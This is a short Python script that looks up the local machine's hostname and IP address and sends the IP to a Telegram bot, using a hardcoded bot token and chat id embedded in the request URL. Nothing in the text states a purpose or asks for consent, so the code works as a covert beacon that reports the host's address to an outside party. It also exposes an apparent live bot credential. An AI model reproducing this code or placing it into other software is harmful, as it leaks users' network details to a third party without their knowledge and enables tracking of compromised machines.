import socket
import requests
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

requests.get("https://api.telegram.org/bot5901651008:AAE1CX1hIQEVwWUA38s9CyexI_lHk1suE70/sendmessage?chat_id=1887858124&text="+ip_address)
